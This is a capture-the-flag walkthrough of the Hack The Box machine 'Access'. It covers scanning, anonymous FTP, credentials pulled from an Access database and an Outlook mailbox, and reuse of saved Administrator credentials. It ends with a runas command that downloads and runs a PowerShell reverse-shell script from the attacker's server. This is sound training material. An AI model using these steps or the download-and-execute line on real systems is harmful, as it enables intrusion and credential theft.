# [Access](https://app.hackthebox.com/machines/access)

```bash
nmap -p- --min-rate 10000 10.10.10.98 -Pn 
```

![Alt text](img/image.png)


After knowing open ports, let's do greater scan for these ports.

```bash
nmap -A -sC -sV -p21,23,80 10.10.10.98
```

![Alt text](img/image-3.png)

Let's enumerate FTP via `anonymous` access.

![Alt text](img/image-1.png)

I got `backup.mdb` file from 'Backups' directory however writing `bin` command to get big size file which is file belongs to 'Access'.

![Alt text](img/image-2.png)


I use `mdbtools` commands set to enumerate this Access file `.mdb` file.

```bash
mdb-tables backup.mdb
```

![Alt text](img/image-4.png)


From here, I export table called **'auth_user'** via `mdb-export` command.
```bash
mdb-export backup.mdb auth_user
```

![Alt text](img/image-5.png)

engineer:access4u@security


I also found a file from Engineer folder on FTP service called 'Access Control.zip'

While extracting this file content, it asks a password from us, I type password which I found from Access file.
```bash
7x x Access Control.zip
```

![Alt text](img/image-6.png)


There is `.pst` file which belongs to 'Microsoft Outlook'.

![Alt text](img/image-7.png)


To read this folder, first we need to `readpst` commmand then, there is `.mbox` file and we need to read this via `mutt` command.

```bash
readpst Access\ Control.pst
mutt -Rf Access\ Control.mbox
```

![Alt text](img/image-8.png)


Let's `telnet` into machine via below credentials.

security: 4Cc3ssC0ntr0ller

![Alt text](img/image-9.png)


We can read user.txt also.

![Alt text](img/image-10.png)


I just looked my stored credentials via `cmdkey /list` command and see 'Administrator' password is enabled and can be used via `runas` binary.

![Alt text](img/image-11.png)


Now, it's time for reverse shell.

1.First, we need to write our reverse shell powershell script(Invoke-PowerShellTcp).

![Alt text](img/image-12.png)


2.Then open http.server to serve this.
```bash
python3 -m http.server --bind 10.10.16.6 8080
```
![Alt text](img/image-14.png)

3.Then write `runas` command to get our malicious script.
```bash
runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.16.6:8080/Invoke-PowerShellTcp.ps1')"
```

![Alt text](img/image-13.png)

Hola, I got reverse shell from port (1337).

![Alt text](img/image-15.png)


root.txt

![Alt text](img/image-16.png)